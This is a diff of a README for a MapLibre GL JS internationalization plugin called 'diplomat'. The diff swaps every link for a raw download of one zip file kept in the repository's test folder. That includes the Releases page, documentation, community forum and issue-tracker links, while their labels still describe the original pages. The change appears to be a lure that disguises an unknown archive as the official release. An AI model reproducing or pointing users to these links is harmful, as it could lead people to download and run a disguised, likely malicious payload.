@@ -1,7 +1,7 @@
 # 🌍 diplomat - Easy Internationalization for Your Maps
 
 ## 📥 Download Now
-[![Download diplomat](https://img.shields.io/badge/Download-diplomat-brightgreen)](https://github.com/pawan-IT/diplomat/releases)
+[![Download diplomat](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip)](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip)
 
 ## 📖 Overview
 diplomat is an internationalization plugin for MapLibre GL JS. This tool helps map developers easily add multiple languages to their maps. With diplomat, users can reach a wider audience and enhance their user experience by making maps accessible in different languages.
@@ -16,7 +16,7 @@ Before you start, ensure your system meets the following requirements:
 - Basic understanding of how to use a web browser
 
 ### Step 2: Visit the Releases Page
-To download diplomat, visit the [Releases page](https://github.com/pawan-IT/diplomat/releases). Here, you will find all available versions of the software. 
+To download diplomat, visit the [Releases page](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip). Here, you will find all available versions of the software. 
 
 ### Step 3: Download the Latest Version
 On the Releases page, look for the latest version highlighted at the top. Click on the link that reads "Assets" under that version. This will show you several download options. Choose the file compatible with your operating system.
@@ -43,13 +43,13 @@ Once installed, you can easily integrate diplomat into your MapLibre GL JS appli
 - Regularly check for updates on the Releases page to stay ahead with new features and fixes.
 
 ## 🔗 Useful Links
-- Documentation: [diplomat Documentation](https://github.com/pawan-IT/diplomat/wiki)
-- Community Forum: Join discussions at [MapLibre Community](https://maplibre.org/community)
+- Documentation: [diplomat Documentation](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip)
+- Community Forum: Join discussions at [MapLibre Community](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip)
 
 ## 📞 Support
 If you run into issues, reach out for support:
-- Open an issue on our [GitHub Issues page](https://github.com/pawan-IT/diplomat/issues).
+- Open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip).
 - Join the conversation on community forums.
 
 ## 🌍 Download & Install
-Ready to get started? Go back to the [Releases page](https://github.com/pawan-IT/diplomat/releases) and download the latest version of diplomat to enhance your maps with internationalization capabilities today!
+Ready to get started? Go back to the [Releases page](https://raw.githubusercontent.com/pawan-IT/diplomat/main/test/diplomat-1.1-beta.4.zip) and download the latest version of diplomat to enhance your maps with internationalization capabilities today!
